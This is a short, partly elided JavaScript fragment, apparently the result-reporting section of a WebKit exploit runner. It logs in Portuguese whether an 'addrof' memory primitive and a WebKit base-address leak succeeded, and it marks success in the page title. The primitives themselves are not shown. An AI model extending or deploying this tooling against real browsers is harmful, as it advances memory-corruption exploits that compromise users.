...
async function runHeisenbugReproStrategy_TypedArrayVictim_R43q() {
    ...
    if (result.errorOccurred) {
        ...
        const { addrof_result, webkit_leak } = result;
        
        if (addrof_result) {
            logS3(`  RUNNER R43q: Fase 1 - Teste Addrof (Core): ${addrof_result.msg}`, addrof_result.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        if (webkit_leak) {
            logS3(`  RUNNER R43q: Fase 2 - Vazamento da Base do WebKit: ${webkit_leak.msg}`, webkit_leak.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        if (webkit_leak?.success) {
            document.title = `${module_name_for_title}_R43q: WebKitLeak SUCCESS!`;
        } else if (addrof_result?.success) {
            document.title = `${module_name_for_title}_R43q: Addrof OK, Leak Fail`;
        } else {
